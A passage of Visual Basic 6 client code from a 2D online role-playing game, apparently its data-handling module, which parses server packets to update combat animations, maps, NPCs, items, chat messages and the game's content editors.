    ' Set player to attacking
    'If I <> MyIndex Then
    If TempPlayer(i).Attacking = 0 Then
    TempPlayer(i).Attacking = 1
    TempPlayer(i).AttackTimer = GetTickCount
    TempPlayer(i).AttackAnim = Rand(0, 1)
    End If
    'End If
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAttack", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcAttack(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long, Victim As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    ' Set player to attacking
    TempMapNpc(i).Attacking = 1
    TempMapNpc(i).AttackTimer = GetTickCount
    If MapNpc(i).Num > 0 Then
        If Npc(MapNpc(i).Num).GFXPack = 1 Then TempMapNpc(i).AttackData1 = Rand(0, 1)
    End If
    
    Victim = Buffer.ReadLong
    If Victim = MyIndex And Buffer.ReadByte = 1 Then
        'ReceiveAttack = GetTickCount
    End If
    
    TempMapNpc(i).AttackType = Buffer.ReadByte
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcAttack", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCheckForMap(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim i As Long
Dim NeedMap As Byte
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()

    ' Erase all players except self
    For i = 1 To MAX_PLAYERS
        If i <> MyIndex Then
            Call SetPlayerMap(i, 0)
        End If
    Next

    ' Erase all temporary tile values
    Call ClearMapNpcs
    Call ClearMapItems
    Call ClearMap
    
    ' clear the blood
    For i = 1 To MAX_BYTE
        Blood(i).X = 0
        Blood(i).Y = 0
        Blood(i).Sprite = 0
        Blood(i).Timer = 0
    Next
    
    ' Get map num
    X = Buffer.ReadLong
    ' Get revision
    Y = Buffer.ReadLong

    If FileExist(MAP_PATH & "map" & X & MAP_EXT, False) Then
        Call LoadMap(X)
        ' Check to see if the revisions match
        NeedMap = 1

        If Map.Revision = Y Then
            ' We do so we dont need the map
            'Call SendData(CNeedMap & SEP_CHAR & "n" & END_CHAR)
            NeedMap = 0
            CacheNewMapSounds
            initAutotiles
        End If

    Else
        NeedMap = 1
    End If

    ' Either the revisions didn't match or we dont have the map, so we need it
    Set Buffer = New clsBuffer
    Buffer.WriteLong CNeedMap
    Buffer.WriteLong NeedMap
    SendData Buffer.ToArray()
    Set Buffer = Nothing
    
    GettingMap = True
    
    ' Check if we get a map from someone else and if we were editing a map cancel it out
    If InMapEditor Then
        InMapEditor = False
        frmEditor_Map.visible = False
        
        ClearAttributeDialogue

        If frmEditor_MapProperties.visible Then
            frmEditor_MapProperties.visible = False
        End If
    End If
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCheckForMap", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleMapData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim X As Long
Dim Y As Long
Dim i As Long, Z As Long, w As Long
Dim Buffer As clsBuffer
Dim MapNum As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()

    MapNum = Buffer.ReadLong
    Map.Name = Buffer.ReadString
    Map.Music = Buffer.ReadString
    Map.BGS = Buffer.ReadString
    Map.Revision = Buffer.ReadLong
    Map.Moral = Buffer.ReadByte
    Map.Up = Buffer.ReadLong
    Map.Down = Buffer.ReadLong
    Map.Left = Buffer.ReadLong
    Map.Right = Buffer.ReadLong
    Map.BootMap = Buffer.ReadLong
    Map.BootX = Buffer.ReadByte
    Map.BootY = Buffer.ReadByte
    
    Map.Weather = Buffer.ReadLong
    Map.WeatherIntensity = Buffer.ReadLong
    
    Map.Fog = Buffer.ReadLong
    Map.FogSpeed = Buffer.ReadLong
    Map.FogOpacity = Buffer.ReadLong
    Map.FogDir = Buffer.ReadByte
    
    Map.Red = Buffer.ReadLong
    Map.Green = Buffer.ReadLong
    Map.Blue = Buffer.ReadLong
    Map.Alpha = Buffer.ReadLong
    
    Map.MaxX = Buffer.ReadByte
    Map.MaxY = Buffer.ReadByte
    
    'Map.Ambiente = Buffer.ReadByte
    
    ReDim Map.Tile(0 To Map.MaxX, 0 To Map.MaxY)

    For X = 0 To Map.MaxX
        For Y = 0 To Map.MaxY
            For i = 1 To MapLayer.Layer_Count - 1
                Map.Tile(X, Y).layer(i).X = Buffer.ReadLong
                Map.Tile(X, Y).layer(i).Y = Buffer.ReadLong
                Map.Tile(X, Y).layer(i).Tileset = Buffer.ReadLong
            Next
            For Z = 1 To MapLayer.Layer_Count - 1
                Map.Tile(X, Y).Autotile(Z) = Buffer.ReadLong
            Next
            Map.Tile(X, Y).Type = Buffer.ReadByte
            Map.Tile(X, Y).Data1 = Buffer.ReadLong
            Map.Tile(X, Y).Data2 = Buffer.ReadLong
            Map.Tile(X, Y).Data3 = Buffer.ReadLong
            Map.Tile(X, Y).Data4 = Buffer.ReadString
            Map.Tile(X, Y).DirBlock = Buffer.ReadByte
        Next
    Next

    For X = 1 To MAX_MAP_NPCS
        Map.Npc(X) = Buffer.ReadLong
        Map.NpcSpawnType(X) = Buffer.ReadLong
        n = n + 1
    Next
    Map.Panorama = Buffer.ReadLong
    
    Map.Fly = Buffer.ReadByte
    Map.Ambiente = Buffer.ReadByte
    initAutotiles
    
    Set Buffer = Nothing
    
    ' Save the map
    Call SaveMap(MapNum)

    ' Check if we get a map from someone else and if we were editing a map cancel it out
    If InMapEditor Then
        InMapEditor = False
        frmEditor_Map.visible = False
        
        ClearAttributeDialogue

        If frmEditor_MapProperties.visible Then
            frmEditor_MapProperties.visible = False
        End If
    End If
    
    CacheNewMapSounds

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapItemData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()

    For i = 1 To MAX_MAP_ITEMS
        With MapItem(i)
            .playerName = Buffer.ReadString
            .Num = Buffer.ReadLong
            .Value = Buffer.ReadLong
            .X = Buffer.ReadLong
            .Y = Buffer.ReadLong
        End With
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapItemData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapNpcData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()

    For i = 1 To MAX_MAP_NPCS
        With MapNpc(i)
            .Num = Buffer.ReadLong
            .X = Buffer.ReadLong
            .Y = Buffer.ReadLong
            .Dir = Buffer.ReadLong
            .Vital(HP) = Buffer.ReadLong
            .MaxHP = Buffer.ReadLong
            Buffer.ReadLong
        End With
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapNpcDataXY(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    i = Buffer.ReadLong

    With MapNpc(i)
        .X = Buffer.ReadLong
        .Y = Buffer.ReadLong
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapDone()
Dim i As Long
Dim MusicFile As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    ' clear the action msgs
    For i = 1 To MAX_BYTE
        ClearActionMsg (i)
    Next i
    Action_HighIndex = 1
    
    ' load tilesets we need
    LoadTilesets
            
    MusicFile = Trim$(Map.Music)
    If Not MusicFile = "None." Then
        PlayMusic MusicFile
    Else
        StopMusic
    End If
    
    Npc_HighIndex = 0
    
    ' Get the npc high Index
    For i = MAX_MAP_NPCS To 1 Step -1
        If MapNpc(i).Num > 0 Then
            Npc_HighIndex = i
            Exit For
        End If
    Next
    
    For i = 1 To MAX_BYTE
        ClearAnimInstance (i)
    Next
    
    initAutotiles
    
    CurrentWeather = Map.Weather
    CurrentWeatherIntensity = Map.WeatherIntensity
    CurrentFog = Map.Fog
    CurrentFogSpeed = Map.FogSpeed
    CurrentFogOpacity = Map.FogOpacity
    CurrentTintR = Map.Red
    CurrentTintG = Map.Green
    CurrentTintB = Map.Blue
    CurrentTintA = Map.Alpha

    GettingMap = False
    CanMoveNow = True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapDone", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBroadcastMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Msg = Buffer.ReadString
    color = Buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBroadcastMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleGlobalMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Msg = Buffer.ReadString
    color = Buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleGlobalMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Msg = Buffer.ReadString
    color = Buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Msg = Buffer.ReadString
    color = Buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAdminMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Msg = Buffer.ReadString
    color = Buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAdminMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpawnItem(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong

    With MapItem(n)
        .playerName = Buffer.ReadString
        .Num = Buffer.ReadLong
        .Value = Buffer.ReadLong
        .X = Buffer.ReadLong
        .Y = Buffer.ReadLong
        .Gravity = -10
        .YOffset = .Y
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpawnItem", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleItemEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Item
        Editor = EDITOR_ITEM
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_ITEMS
            .lstIndex.AddItem i & ": " & Trim$(Item(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        ItemEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleItemEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAnimationEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Animation
        Editor = EDITOR_ANIMATION
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_ANIMATIONS
            .lstIndex.AddItem i & ": " & Trim$(Animation(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        AnimationEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAnimationEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateItem(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer
Dim ItemSize As Long
Dim ItemData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong
    ' Update the item
    ItemSize = LenB(Item(n))
    ReDim ItemData(ItemSize - 1)
    ItemData = Buffer.ReadBytes(ItemSize)
    CopyMemory ByVal VarPtr(Item(n)), ByVal VarPtr(ItemData(0)), ItemSize
    Set Buffer = Nothing
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateItem", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateAnimation(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer
Dim AnimationSize As Long
Dim AnimationData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong
    ' Update the Animation
    AnimationSize = LenB(Animation(n))
    ReDim AnimationData(AnimationSize - 1)
    AnimationData = Buffer.ReadBytes(AnimationSize)
    CopyMemory ByVal VarPtr(Animation(n)), ByVal VarPtr(AnimationData(0)), AnimationSize
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateAnimation", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpawnNpc(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long, i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong

    With MapNpc(n)
        .Num = Buffer.ReadLong
        .X = Buffer.ReadLong
        .Y = Buffer.ReadLong
        .Dir = Buffer.ReadLong
        ' Client use only
        TempMapNpc(n).xOffset = 0
        TempMapNpc(n).YOffset = 0
        TempMapNpc(n).Moving = 0
        TempMapNpc(n).SpawnDelay = Buffer.ReadByte
    End With
    
    Npc_HighIndex = 0
    
    ' Get the npc high Index
    For i = MAX_MAP_NPCS To 1 Step -1
        If MapNpc(i).Num > 0 Then
            Npc_HighIndex = i
            Exit For
        End If
    Next

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpawnNpc", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcDead(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong
    Call ClearMapNpc(n)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcDead", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_NPC
        Editor = EDITOR_NPC
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_NPCS
            .lstIndex.AddItem i & ": " & Trim$(Npc(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        NpcEditorInit
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateNpc(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer
Dim NpcSize As Long
Dim NpcData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    n = Buffer.ReadLong
    
    NpcSize = LenB(Npc(n))
    ReDim NpcData(NpcSize - 1)
    NpcData = Buffer.ReadBytes(NpcSize)
    CopyMemory ByVal VarPtr(Npc(n)), ByVal VarPtr(NpcData(0)), NpcSize
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateNpc", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleResourceEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Resource
        Editor = EDITOR_RESOURCE
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_RESOURCES
            .lstIndex.AddItem i & ": " & Trim$(Resource(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        ResourceEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleResourceEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateResource(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim ResourceNum As Long
Dim Buffer As clsBuffer
Dim ResourceSize As Long
Dim ResourceData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    ResourceNum = Buffer.ReadLong
    
    ResourceSize = LenB(Resource(ResourceNum))
    ReDim ResourceData(ResourceSize - 1)
    ResourceData = Buffer.ReadBytes(ResourceSize)
    
    ClearResource ResourceNum
    
    CopyMemory ByVal VarPtr(Resource(ResourceNum)), ByVal VarPtr(ResourceData(0)), ResourceSize
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateResource", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapKey(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim EventNum As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadByte
    EventNum = Buffer.ReadLong
    Player(MyIndex).EventOpen(EventNum) = n
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapKey", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleEditMap()
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Call MapEditorInit
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleEditMap", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleShopEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Shop
        Editor = EDITOR_SHOP
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_SHOPS
            .lstIndex.AddItem i & ": " & Trim$(Shop(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        ShopEditorInit
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleShopEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateShop(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim shopnum As Long
Dim Buffer As clsBuffer
Dim ShopSize As Long
Dim ShopData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    shopnum = Buffer.ReadLong
    
    ShopSize = LenB(Shop(shopnum))
    ReDim ShopData(ShopSize - 1)
    ShopData = Buffer.ReadBytes(ShopSize)
    CopyMemory ByVal VarPtr(Shop(shopnum)), ByVal VarPtr(ShopData(0)), ShopSize
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateShop", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpellEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Spell
        Editor = EDITOR_SPELL
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_SPELLS
            .lstIndex.AddItem i & ": " & Trim$(Spell(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        SpellEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpellEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateSpell(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim spellnum As Long
Dim Buffer As clsBuffer
Dim SpellSize As Long
Dim SpellData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    spellnum = Buffer.ReadLong
    
    SpellSize = LenB(Spell(spellnum))
    ReDim SpellData(SpellSize - 1)
    SpellData = Buffer.ReadBytes(SpellSize)
    CopyMemory ByVal VarPtr(Spell(spellnum)), ByVal VarPtr(SpellData(0)), SpellSize
    Set Buffer = Nothing
    
    ' Update the spells on the pic
    'Set Buffer = New clsBuffer
    'Buffer.WriteLong CSpells
    'SendData Buffer.ToArray()
    'Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateSpell", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleSpells(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    For i = 1 To MAX_PLAYER_SPELLS
        PlayerSpells(i) = Buffer.ReadLong
    Next
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpells", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleLeft(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Call ClearPlayer(Buffer.ReadLong)
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleLeft", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleResourceCache(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long
Dim ResourceNum As Long
Dim UpdateTile As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    ' if in map editor, we cache shit ourselves
    If InMapEditor Then Exit Sub
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    ResourceNum = Buffer.ReadLong
    Resources_Init = False

    If ResourceNum = 0 Then
        Resource_Index = Buffer.ReadLong
        If Resource_Index > 0 Then
            ReDim Preserve MapResource(0 To Resource_Index)
    
            For i = 1 To Resource_Index
                MapResource(i).ResourceState = Buffer.ReadByte
                MapResource(i).X = Buffer.ReadLong
                MapResource(i).Y = Buffer.ReadLong
                UpdateTile = Buffer.ReadLong
                If UpdateTile > 0 Then
                    Map.Tile(MapResource(i).X, MapResource(i).Y).Type = TILE_TYPE_RESOURCE
                    Map.Tile(MapResource(i).X, MapResource(i).Y).Data1 = UpdateTile
                End If
            Next
    
            Resources_Init = True
        Else
            ReDim MapResource(0 To 1)
        End If
    Else
        MapResource(ResourceNum).ResourceState = Buffer.ReadByte
        MapResource(ResourceNum).X = Buffer.ReadLong
        MapResource(ResourceNum).Y = Buffer.ReadLong
        UpdateTile = Buffer.ReadLong
        If UpdateTile > 0 Then
            Map.Tile(MapResource(i).X, MapResource(i).Y).Type = TILE_TYPE_RESOURCE
            Map.Tile(MapResource(i).X, MapResource(i).Y).Data1 = UpdateTile
        End If
        Resources_Init = True
    End If

    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleResourceCache", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSendPing(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    PingEnd = GetTickCount
    Ping = PingEnd - PingStart
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSendPing", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub


Private Sub HandleActionMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim X As Long, Y As Long, message As String, color As Long, tmpType As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
